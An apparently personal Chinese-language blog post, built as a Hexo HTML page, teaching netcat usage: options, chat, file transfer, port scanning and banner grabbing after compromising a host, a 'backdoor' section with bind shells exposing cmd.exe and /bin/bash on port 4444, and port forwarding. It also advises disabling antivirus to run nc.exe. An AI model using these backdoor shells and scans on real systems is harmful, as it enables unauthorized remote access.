@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀">
+<meta name="keywords" content="工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Netcat">
+<meta property="og:url" content="https://alpha302.github.io/2019/03/27/Netcat/index.html">
+<meta property="og:site_name" content="Alpha的小站">
+<meta property="og:description" content="nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/E32E2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/32323.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/21312312312.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/21213123.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/434343f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/434343f.png">
+<meta property="og:updated_time" content="2020-03-27T14:46:50.074Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Netcat">
+<meta name="twitter:description" content="nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/alpha302/cloudimg/master/E32E2.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Netcat</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/music">Music</a></li>
+         
+          <li><a href="/about">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/13/vps配置ngrok反向代理/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://alpha302.github.io/2019/03/27/Netcat/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://alpha302.github.io/2019/03/27/Netcat/&text=Netcat"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alpha302.github.io/2019/03/27/Netcat/&is_video=false&description=Netcat"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Netcat&body=Check out this article: https://alpha302.github.io/2019/03/27/Netcat/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://alpha302.github.io/2019/03/27/Netcat/&name=Netcat&description=&lt;p&gt;nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-netcat常用参数"><span class="toc-number">1.</span> <span class="toc-text">1.netcat常用参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-基础使用"><span class="toc-number">2.</span> <span class="toc-text">2.基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-简单通信"><span class="toc-number">2.1.</span> <span class="toc-text">2.1   简单通信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-文件传输"><span class="toc-number">2.2.</span> <span class="toc-text">2.2     文件传输</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-内网探测"><span class="toc-number">3.</span> <span class="toc-text">3.内网探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-端口扫描"><span class="toc-number">3.1.</span> <span class="toc-text">3.1   端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Banner抓取"><span class="toc-number">3.2.</span> <span class="toc-text">3.2   Banner抓取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-建立后门"><span class="toc-number">4.</span> <span class="toc-text">4.建立后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-对windows建立后门"><span class="toc-number">4.1.</span> <span class="toc-text">4.1    对windows建立后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-对linux建立后门"><span class="toc-number">4.2.</span> <span class="toc-text">4.2    对linux建立后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-netcat连接转发-端口转发"><span class="toc-number">5.</span> <span class="toc-text">5.netcat连接转发(端口转发)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-windows下载"><span class="toc-number">6.</span> <span class="toc-text">6.windows下载</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Netcat
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Alpha的小站</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-03-27T14:31:38.000Z" itemprop="datePublished">2019-03-27</time>
+    </div>
+
+
+      
+    <span class="article-categories">
+        分类：<a class="category-link" href="/categories/工具/">工具</a>
+    </span>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/工具/">工具</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀</p>
+<a id="more"></a>
+
+<hr>
+<h1 id="1-netcat常用参数"><a href="#1-netcat常用参数" class="headerlink" title="1.netcat常用参数"></a>1.netcat常用参数</h1><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"><span class="symbol">l:</span>设置netcat处于监听状态等待连接</span></span><br><span class="line"><span class="ruby">-L：设置netcat处于监听状态等待连接，当客户端断开，服务端依旧回到等待状态</span></span><br><span class="line"><span class="ruby">-p：本地监听端口号</span></span><br><span class="line"><span class="ruby">-v：显示端口信息，如果使用-vv的话，则显示更加详细的端口信息</span></span><br><span class="line"><span class="ruby">-e：执行某个程序，如cmd.exe</span></span><br><span class="line"><span class="ruby">-<span class="symbol">n:</span>只识别IP地址，不对目标进行DNS解析</span></span><br><span class="line"><span class="ruby">-u：使用UDP模式（nc默认使用tcp连接）</span></span><br><span class="line"><span class="ruby">-z：zero I/O模式，专用端口扫描。表示对目标IP发送的数据表中不包含payload，加快扫描速度</span></span><br><span class="line"><span class="ruby">-<span class="symbol">w1:</span>超时设置<span class="number">1</span>秒</span></span><br><span class="line"><span class="ruby">-<span class="symbol">d:</span>脱离命令窗口，在后台运行，常用于后门的建立过程</span></span><br><span class="line"><span class="ruby">-<span class="symbol">G:</span>gateway 设置网关，用于内网突破限制</span></span><br><span class="line"><span class="ruby">-g：num，路由调数</span></span><br><span class="line"><span class="ruby">-o <span class="symbol">:file</span>,设置传输<span class="number">16</span>进制的数据</span></span><br><span class="line"><span class="ruby">-<span class="symbol">s:</span>addr,设置netcat源地址，隐藏自己的ip地址</span></span><br><span class="line"><span class="ruby">-t：恢复telnet的请求数据包</span></span><br><span class="line"><span class="ruby">-r：设置netcat随机化的端口号</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="2-基础使用"><a href="#2-基础使用" class="headerlink" title="2.基础使用"></a>2.基础使用</h1><h2 id="2-1-简单通信"><a href="#2-1-简单通信" class="headerlink" title="2.1   简单通信"></a>2.1   简单通信</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一般通信:</span><br><span class="line">创建服务端：nc -l -p <span class="number">4444</span></span><br><span class="line">创建客户端：nc <span class="number">192.168</span>.<span class="number">59.138</span> <span class="number">4444</span></span><br><span class="line">此时并不能对服务端进行命令执行</span><br><span class="line"></span><br><span class="line">返回<span class="keyword">shell</span><span class="bash">的通信：</span></span><br><span class="line">服务端：nc -l -p <span class="number">4444</span> -e <span class="keyword">cmd</span>.<span class="bash">exe</span></span><br><span class="line">客户器端可以对服务端执行<span class="keyword">cmd</span><span class="bash">的命令</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/E32E2.jpg" alt="注：我是在同一台电脑里进行nc实验的，客户端的ip应填服务器的ip。"><br>注：我是在同一台电脑里进行nc实验的，客户端的ip应填服务器的ip。</p>
+<h2 id="2-2-文件传输"><a href="#2-2-文件传输" class="headerlink" title="2.2     文件传输"></a>2.2     文件传输</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">创建服务端：nc -l -p <span class="number">4444</span> &gt; outfile</span><br><span class="line"> 服务端接受一个文件并重定向到 outfile</span><br><span class="line"></span><br><span class="line">创建客户端：nc <span class="number">192.168</span><span class="number">.59</span><span class="number">.138</span> <span class="number">4444</span> &lt; infile</span><br><span class="line"> 实现了客户端向服务器端传输文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/32323.png" alt></p>
+<h1 id="3-内网探测"><a href="#3-内网探测" class="headerlink" title="3.内网探测"></a>3.内网探测</h1><h2 id="3-1-端口扫描"><a href="#3-1-端口扫描" class="headerlink" title="3.1   端口扫描"></a>3.1   端口扫描</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得目标的权限之后，目标没有途径可以去进行内网探测，此时可以用nc对内网ip和端口进行扫描</span><br><span class="line">-nc -v -n -z -w1 <span class="number">192.168</span><span class="number">.59</span><span class="number">.135</span> <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/21312312312.PNG" alt></p>
+<h2 id="3-2-Banner抓取"><a href="#3-2-Banner抓取" class="headerlink" title="3.2   Banner抓取"></a>3.2   Banner抓取</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-echo “ ” | -nc -v -n -z -w1 <span class="number">192.168</span><span class="number">.59</span><span class="number">.135</span> <span class="number">1</span><span class="number">-65535</span></span><br><span class="line">banner 信息来表示欢迎语，其中会包含一些敏感信息，所以获取 banner 也属于信息搜集的范畴。</span><br></pre></td></tr></table></figure>
+
+<h1 id="4-建立后门"><a href="#4-建立后门" class="headerlink" title="4.建立后门"></a>4.建立后门</h1><blockquote>
+<p>原理：netcat一切数据通过标准输入/输出流实现的，所以可以利用netcat的命令进行后门的简历，并传输结果信息。</p>
+</blockquote>
+<h2 id="4-1-对windows建立后门"><a href="#4-1-对windows建立后门" class="headerlink" title="4.1    对windows建立后门"></a>4.1    对windows建立后门</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-nc -l -p <span class="number">4444</span> -e <span class="keyword">cmd</span>.<span class="bash">exe</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/21213123.PNG" alt></p>
+<h2 id="4-2-对linux建立后门"><a href="#4-2-对linux建立后门" class="headerlink" title="4.2    对linux建立后门"></a>4.2    对linux建立后门</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-nc -l -<span class="selector-tag">p</span> <span class="number">4444</span> -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/434343f.png" alt></p>
+<h1 id="5-netcat连接转发-端口转发"><a href="#5-netcat连接转发-端口转发" class="headerlink" title="5.netcat连接转发(端口转发)"></a>5.netcat连接转发(端口转发)</h1><p>突破某些特殊情况下的连接限制</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>echo nc [<span class="string">target</span>][<span class="symbol">IP</span>]     &gt; delay.bat</span><br><span class="line">delay.bat  nc ip port</span><br><span class="line">-nc -l -p [localport]    -e delay.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/434343f.png" alt></p>
+<h1 id="6-windows下载"><a href="#6-windows下载" class="headerlink" title="6.windows下载"></a>6.windows下载</h1><p><a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">netcat点这</a></p>
+<p>windows下选择netcat 1.11，保存即可。关闭杀毒软件或加入白名单，将nc.exe拖入cmd中即可运行netcat。</p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/music">Music</a></li>
+         
+          <li><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-netcat常用参数"><span class="toc-number">1.</span> <span class="toc-text">1.netcat常用参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-基础使用"><span class="toc-number">2.</span> <span class="toc-text">2.基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-简单通信"><span class="toc-number">2.1.</span> <span class="toc-text">2.1   简单通信</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-文件传输"><span class="toc-number">2.2.</span> <span class="toc-text">2.2     文件传输</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-内网探测"><span class="toc-number">3.</span> <span class="toc-text">3.内网探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-端口扫描"><span class="toc-number">3.1.</span> <span class="toc-text">3.1   端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Banner抓取"><span class="toc-number">3.2.</span> <span class="toc-text">3.2   Banner抓取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-建立后门"><span class="toc-number">4.</span> <span class="toc-text">4.建立后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-对windows建立后门"><span class="toc-number">4.1.</span> <span class="toc-text">4.1    对windows建立后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-对linux建立后门"><span class="toc-number">4.2.</span> <span class="toc-text">4.2    对linux建立后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-netcat连接转发-端口转发"><span class="toc-number">5.</span> <span class="toc-text">5.netcat连接转发(端口转发)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-windows下载"><span class="toc-number">6.</span> <span class="toc-text">6.windows下载</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://alpha302.github.io/2019/03/27/Netcat/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://alpha302.github.io/2019/03/27/Netcat/&text=Netcat"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://alpha302.github.io/2019/03/27/Netcat/&is_video=false&description=Netcat"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Netcat&body=Check out this article: https://alpha302.github.io/2019/03/27/Netcat/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://alpha302.github.io/2019/03/27/Netcat/&title=Netcat"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://alpha302.github.io/2019/03/27/Netcat/&name=Netcat&description=&lt;p&gt;nc全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流 网络中的瑞士军刀&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/music">Music</a></li>
+         
+          <li><a href="/about">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
